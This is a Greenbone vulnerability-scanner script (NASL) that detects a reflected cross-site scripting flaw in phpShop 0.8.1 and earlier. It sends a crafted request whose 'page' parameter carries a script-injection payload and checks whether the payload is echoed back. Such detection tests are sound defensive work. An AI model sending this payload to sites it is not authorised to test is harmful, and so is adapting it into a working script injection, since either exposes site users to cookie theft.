# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:edikon:phpshop";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103093");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-02-28 14:46:59 +0100 (Mon, 28 Feb 2011)");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
  script_name("phpShop <= 0.8.1 'page' Parameter XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("gb_phpshop_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpshop/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/46561");

  script_tag(name:"summary", value:"phpShop is prone to a cross-site scripting (XSS) vulnerability
  because it fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary HTML and
  script code in the browser of an unsuspecting user in the context of the affected site. This may
  allow the attacker to steal cookie-based authentication credentials and to launch other
  attacks.");

  script_tag(name:"affected", value:"phpShop versions 0.8.1 and prior are vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/?page=store/XSS&amp;%26%26"><script>alert(/vt-xss-test/)</script>%3d1';

if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(/vt-xss-test/\)</script>", check_header:TRUE)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(0);
